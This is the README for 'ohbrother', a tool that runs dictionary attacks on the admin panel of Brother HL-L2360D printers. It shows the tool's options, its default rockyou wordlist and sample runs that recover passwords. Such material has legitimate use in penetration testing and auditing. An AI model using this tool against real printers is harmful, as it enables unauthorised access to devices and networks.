# ohbrother
Brother Printer Admin Panel Dictionary attack (Designed for the HL-L2360D series)
```
usage: ohbrother.py [-h] --ip-address IP_ADDRESS [--port PORT] [--wordlist WORDLIST]

Brother Printer Admin Panel Dictionary attack (Designed for the HL-L2360D series)

options:
  -h, --help            show this help message and exit
  --ip-address IP_ADDRESS, -i IP_ADDRESS
                        IP Address of the printer
  --port PORT, -p PORT  Port the admin interface is running on (default: 80)
  --wordlist WORDLIST, -W WORDLIST
                        Wordlist to use to attack the printer (default:
                        /usr/share/wordlists/rockyou.txt)
```

# Usage
Dictionary attack using the default wordlist
```
┌──(kali㉿kali)-[~]
└─$ python3 ohbrother.py --ip-address 192.168.0.77python3 ohbrother.py --ip-address 192.168.0.77
root        : INFO     [*] Starting a dictionary attack on http://192.168.0.77:80/general/status.html
root        : INFO     [*] found correct password: shadow
```
Ohbrother checks for common default brother passwords

```
C:\Users\DrewQ\Desktop\Brother> python3 ohbrother.py --wordlist "C:\Users\DrewQ\Downloads\passwords.txt" --ip-address 192.168.0.77
root        : INFO     [*] default password was set: initpass
```
